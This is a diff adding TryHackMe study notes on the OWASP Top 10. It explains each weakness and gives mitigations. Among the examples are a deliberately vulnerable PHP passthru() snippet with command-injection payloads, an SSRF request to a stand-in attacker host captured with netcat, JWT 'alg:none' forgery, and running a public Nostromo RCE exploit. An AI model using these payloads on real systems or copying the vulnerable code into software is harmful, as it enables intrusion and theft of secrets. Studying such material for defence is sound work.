@@ -1204,3 +1204,329 @@ Burp Suite is the industry-standard framework for **manual web app penetration t
 Community Edition provides the essentials, while Professional adds automation and enterprise-level features.  
 Mastering **Proxy, Repeater, Intruder, and Scope management** is critical for real-world testing.
 
+# OWASP Top 10 (2021) — TryHackMe Notes
+
+> Formatted for GitHub. Clean headings, examples, code blocks, and quick remediation notes.
+
+---
+## Table of Contents
+1. [Broken Access Control](#broken-access-control)
+   - [Insecure Direct Object Reference (IDOR)](#insecure-direct-object-reference-idor)
+2. [Cryptographic Failures](#cryptographic-failures)
+   - [SQLite example](#sqlite-example)
+   - [Cracking weak MD5 hashes (CrackStation)](#cracking-weak-md5-hashes-crackstation)
+3. [Injection](#injection)
+   - [SQL Injection](#sql-injection)
+   - [Command Injection](#command-injection)
+     - [PHP `passthru()` example](#php-passthru-example)
+4. [Insecure Design](#insecure-design)
+   - [Insecure Password Resets](#insecure-password-resets)
+5. [Security Misconfiguration](#security-misconfiguration)
+   - [Debugging Interfaces](#debugging-interfaces)
+6. [Vulnerable and Outdated Components](#vulnerable-and-outdated-components)
+   - [Nostromo 1.9.6 RCE example](#nostromo-196-rce-example)
+7. [Authentication & Session Management](#authentication--session-management)
+   - [Re-registration logic flaw example](#re-registration-logic-flaw-example)
+8. [Identification & Cryptographic Integrity](#identification--cryptographic-integrity)
+   - [Software Integrity Failures (SRI)](#software-integrity-failures-sri)
+   - [Data Integrity Failures (JWT `none` attack)](#data-integrity-failures-jwt-none-attack)
+9. [Logging & Monitoring](#logging--monitoring)
+10. [Server-Side Request Forgery (SSRF)](#server-side-request-forgery-ssrf)
+
+---
+
+## Broken Access Control
+**What it is:** Access controls restrict what authenticated and unauthenticated users can do. When these controls are missing or misconfigured, users can access pages or actions they should not.
+
+**Impact examples:**
+- View other users' sensitive data
+- Access privileged functionality (admin pages)
+- Perform unauthorized actions
+
+**Real-world note:** 2019 example — an attacker could request single frames from a *private* YouTube video and reconstruct content. Private expectation was violated → broken access control.
+
+### Typical causes
+- Missing authorization checks on server-side endpoints
+- Over-reliance on client-side checks (easily bypassed)
+- Predictable URLs/IDs without ownership checks
+
+### Quick mitigations
+- Enforce server-side authorization checks for every request
+- Apply least privilege: users see only what's necessary
+- Use fail-safe defaults (deny unless explicitly allowed)
+- Protect sensitive endpoints and APIs with proper role checks
+
+---
+### Insecure Direct Object Reference (IDOR)
+**Definition:** IDOR occurs when an application exposes a direct reference (e.g., `?id=12345`) and does not verify that the requesting user owns/has access to that object.
+
+**Example:** `https://bank.example/account?id=111111` — attacker increments `id` to `222222` and can view another user's bank details because ownership isn't validated.
+
+**Fixes:**
+- Always check object ownership server-side
+- Use indirect references (random UUIDs, mapping tables) or ensure ACL checks
+- Do not rely on security through obscurity (sequential IDs are weak)
+
+---
+
+## Cryptographic Failures
+**What it is:** Misuse or missing use of cryptography that protects data in transit or at rest. Results in exposure of sensitive data or broken guarantees of confidentiality and integrity.
+
+**Common failures:**
+- Plaintext transport (no TLS)
+- Weak hashing (unsalted MD5, SHA1)
+- Secrets in code/config
+- Reliance on client-side enforcement
+
+**Example levels:** 
+- **Data in transit:** TLS/HTTPS protects network traffic.
+- **Data at rest:** Server-side encryption of stored data (e.g., emails on the provider's servers).
+
+---
+### SQLite example (flat-file DB access)
+If a flat-file DB (e.g., SQLite) sits inside webroot and is downloadable, an attacker can retrieve it and query locally. Example commands and interactions:
+
+```bash
+$ ls -l
+-rw-r--r-- 1 user user 8192 Feb  2 20:33 example.db
+$ file example.db
+example.db: SQLite 3.x database, UTF-8
+
+# Open DB
+$ sqlite3 example.db
+sqlite> .tables
+customers
+
+# Show schema + dump
+sqlite> PRAGMA table_info(customers);
+sqlite> SELECT * FROM customers;
+0|Joy Paulson|4916 9012 2231 7905|5f4dcc3b5aa765d61d8327deb882cf99
+...
+```
+Columns: `custID`, `custName`, `creditCard`, `password` (hash).
+
+**Risk:** Database leak = full access to stored sensitive records.
+
+**Mitigations:**
+- Never store DB files under webroot
+- Apply filesystem permissions and access controls
+- Use dedicated DB servers and restrict access
+
+---
+### Cracking weak MD5 hashes (CrackStation)
+- Weak hashes (e.g., MD5 of common passwords) are trivially cracked via large rainbow/wordlist databases.
+- Example: `5f4dcc3b5aa765d61d8327deb882cf99` → `password` (common MD5 for "password").
+- Tools: CrackStation (web), Hashcat, John the Ripper (local/offline).
+
+**Mitigations:**
+- Use strong password hashing: Argon2, bcrypt, scrypt, PBKDF2 with salts
+- Enforce strong password policies and MFA
+- Monitor for leaked hashes and require resets on exposure
+
+---
+
+## Injection
+**Overview:** Injection occurs when untrusted input is interpreted as code/commands by the server (SQL, OS commands, LDAP, XML, etc.).
+
+### SQL Injection (SQLi)
+**Impact:** Read/modify/delete data, bypass auth, remote code execution in some stacks.
+
+**Prevention:**
+- Use parameterized queries / prepared statements
+- Use ORM safely and avoid dynamic SQL string concatenation
+- Validate and sanitize inputs, prefer allow-lists
+
+### Command Injection
+**Description:** When user input is sent to OS commands (e.g., via `system()`, `exec()`, `passthru()`), attackers can run arbitrary commands.
+
+#### PHP `passthru()` example
+Vulnerable PHP snippet:
+```php
+<?php
+if (isset($_GET["mooing"])) {
+    $mooing = $_GET["mooing"];
+    $cow = 'default';
+
+    if(isset($_GET["cow"]))
+        $cow = $_GET["cow"];
+    
+    passthru("perl /usr/bin/cowsay -f $cow $mooing");
+}
+?>
+```
+**Why vulnerable:** `$cow` and `$mooing` are concatenated into a shell command without sanitization. An attacker can inject inline commands like `$(whoami)` (or use `;`, `&&`, backticks depending on shell) to execute arbitrary commands.
+
+**Example payloads to test:** `$(whoami)`, `$(id)`, `$(uname -a)`, `$(ifconfig)`
+
+**Mitigations:**
+- Avoid invoking shells with untrusted input
+- Use safe APIs (no shell interpretation) or properly escape input
+- Validate/allow-list expected values (e.g., specific cow names)
+- Run services with least privilege
+
+---
+
+## Insecure Design
+**Definition:** Architectural or design-level weaknesses introduced early in the SDLC, typically from missing threat modelling. They require changes to design rather than quick code fixes.
+
+**Examples:** disabling security features in dev and shipping to prod, weak OTP schemes, improper rate-limiting design that can be abused via distributed IPs.
+
+### Insecure Password Resets
+**Case study (conceptual):** Instagram used 6-digit SMS codes. Rate-limiting applied per-IP only, allowing distributed attack from many IPs to brute-force the 6-digit code. Attackers can use cloud IPs to parallelize attempts.
+
+**Mitigations:**
+- Rate limit per-account and implement progressive throttling
+- Use device/fingerprint and anomaly detection
+- Use multi-factor authentication and short expiry codes
+- Ensure reset flows include out-of-band confirmation
+
+**Prevention:** Threat-model during design, secure development lifecycle (SSDLC), and defensive patterns from the start.
+
+---
+
+## Security Misconfiguration
+**What it is:** Defaults, unnecessary features, open cloud buckets, verbose error messages, exposed admin/debug endpoints, missing HTTP security headers, etc.
+
+**Common issues:**
+- Default credentials left unchanged
+- Exposed admin panels or debug consoles
+- Overly verbose error messages leaking stack traces or config
+- Missing Content-Security-Policy, X-Frame-Options, Strict-Transport-Security
+
+### Debugging Interfaces
+**Danger:** Framework debug consoles (e.g., Werkzeug console in Python) may allow arbitrary code execution if exposed in production. Patreon hack (2015) demonstrates real-world impact when debug consoles are accessible.
+
+**Mitigations:**
+- Ensure debug features are disabled in production
+- Harden admin/debug endpoints (auth, allow-list IPs)
+- Remove dev tooling and test endpoints before deployment
+
+---
+
+## Vulnerable and Outdated Components
+**Issue:** Using known vulnerable versions (CMS, libs, web servers) with public exploits leads to trivial compromise if not patched.
+
+**Example flow:**
+1. Find version (banner, headers, `robots.txt`, files)
+2. Search Exploit-DB or vendor advisories for known exploits
+3. Use or adapt exploit script (may require small fixes)
+
+### Nostromo 1.9.6 — CVE-2019-16278 example
+- Found default Nostromo page and version `1.9.6`
+- Found exploit on Exploit-DB (script 47837.py), minor edit required (comment out an offending line)
+- Running exploit returned `uid=1001(_nostromo) ...` — Remote Code Execution (RCE)
+
+**Mitigations:**
+- Maintain an inventory of software and versions
+- Patch/update components; remove unused features
+- Subscribe to security advisories and perform scheduled upgrades
+
+---
+
+## Authentication & Session Management
+**Purpose:** Identify users (auth) and maintain state via sessions (cookies/tokens). Weaknesses here allow account takeover and session fixation.
+
+**Common issues:**
+- Weak password policies → brute force
+- No lockout or weak rate-limiting
+- Predictable session cookies or tokens
+- Missing MFA
+
+**Mitigations:**
+- Enforce strong password rules and MFA
+- Implement account lockout / progressive delays
+- Use secure, random, and signed session tokens (HttpOnly, Secure flags)
+- Proper logout/invalidation of tokens/sessions
+
+### Re-registration logic flaw example
+**Scenario:** Registering a username with a leading/trailing whitespace (`" admin"`) creates a separate account that may inherit or collide with an existing user's privileges or expose that user's content. Example: registering `" darren"` logged in and accessed `darren`'s content.
+
+**Mitigations:**
+- Normalize and validate usernames (trim whitespace, canonicalize)
+- Enforce uniqueness checks and canonical comparisons
+- Sanity-check registration flows and tests for edge cases
+
+---
+
+## Identification & Cryptographic Integrity
+**Integrity definition:** Ensuring data hasn't been tampered with. Hashes/digests allow verification of file integrity after download (e.g., `md5sum`, `sha256sum`).
+
+**Example — verifying WinSCP installer:**
+```bash
+$ md5sum WinSCP-5.21.5-Setup.exe
+$ sha1sum WinSCP-5.21.5-Setup.exe
+$ sha256sum WinSCP-5.21.5-Setup.exe
+```
+If computed values match published hashes → file integrity preserved.
+
+### Software Integrity Failures (SRI)
+**Problem:** Including third-party JS without integrity checks allows supply-chain compromise. Example:
+```html
+<script src="https://code.jquery.com/jquery-3.6.1.min.js"></script>
+```
+**Fix (Subresource Integrity):**
+```html
+<script src="https://code.jquery.com/jquery-3.6.1.min.js"
+  integrity="sha256-o88AwQnZB+VDvE9tvIXrMQaPlFFSUTR+nldQm1LuPXQ="
+  crossorigin="anonymous"></script>
+```
+Use SRI hashes (generate via tools like https://www.srihash.org/).
+
+### Data Integrity Failures (JWT `none` algorithm attack)
+**Background:** JWTs have three base64 parts: `header.payload.signature`. Some vulnerable libraries allowed `alg: none` in header and skipped signature verification if signature omitted.
+**Attack:** Modify header to `{"alg":"none"}` and change payload (e.g., `username: "admin"`), then remove signature. Vulnerable implementations accept the token — severe integrity bypass.
+**Mitigations:**
+- Use well-maintained JWT libraries
+- Reject tokens with `alg: none` or explicitly validate allowed algorithms
+- Enforce server-side session checks where appropriate
+
+---
+
+## Logging & Monitoring
+**Why it matters:** Logs are key to detect incidents and perform forensics. Without them, breaches may go undetected and cause regulatory, operational, and reputational harm.
+
+**Useful log fields:**
+- Timestamps
+- HTTP status codes
+- Usernames / account identifiers
+- Endpoints requested (URI)
+- Source IP addresses
+- Any authorization decision outcomes
+
+**Monitoring & detection tips:**
+- Alert on high-impact suspicious events (e.g., repeated auth failures, admin access from new IP)
+- Rate events by severity and tune alerts to reduce noise
+- Store logs securely and retain copies for forensic analysis
+
+---
+
+## Server-Side Request Forgery (SSRF)
+**What it is:** A web app can be tricked into making requests on behalf of an attacker to arbitrary destinations. Often arises when the app accepts a URL/host to fetch third-party resources.
+
+**Simple example:** An app takes `server` and `msg` and issues a request to the configured SMS provider:
+```
+https://www.mysite.com/sms?server=attacker.thm&msg=ABC
+```
+The app forwards request to attacker-controlled `attacker.thm`, leaking API keys and payloads (attacker captures via `nc -lvp 80`).
+
+**What SSRF enables:**
+- Internal network enumeration (metadata, internal services)
+- Abuse trust relationships, access internal admin interfaces
+- Interact with non-HTTP services (Redis, memcached) that may lead to RCE
+
+**Mitigations:**
+- Do not fetch arbitrary user-supplied URLs/hosts
+- Resolve and allow-list external domains or block private IP ranges
+- Validate and sanitize URL inputs, employ egress filtering
+
+---
+
+## References & Further Reading
+- OWASP Top 10 (2021)
+- TryHackMe rooms (OWASP Top 10, SSDLC, etc.)
+- Exploit-DB
+- CrackStation (hash cracking)
+- SRI docs and JWT libraries (official docs)
+
+---
+*Notes formatted for GitHub by ChatGPT — ready to commit to a repo.*
